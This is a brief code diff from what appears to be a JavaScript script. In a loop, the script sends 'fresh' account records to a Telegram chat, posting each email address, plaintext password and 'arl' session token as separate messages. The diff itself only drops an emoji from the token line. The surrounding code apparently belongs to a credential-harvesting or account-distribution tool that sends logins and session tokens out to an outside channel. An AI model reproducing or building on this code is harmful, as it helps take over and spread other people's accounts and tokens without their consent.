@@ -225,7 +225,7 @@ async function main() {
         await sendTelegram(`<b>— ${i + 1}/${fresh.length} —</b>`);
         await sendTelegram(`📧 <code>${esc(e.email)}</code>`);
         await sendTelegram(`🔑 <code>${esc(e.password)}</code>`);
-        await sendTelegram(`🎫 <code>${esc(e.arl)}</code>`);
+        await sendTelegram(`<code>${esc(e.arl)}</code>`);
         await delay(500);
       }
     } else {
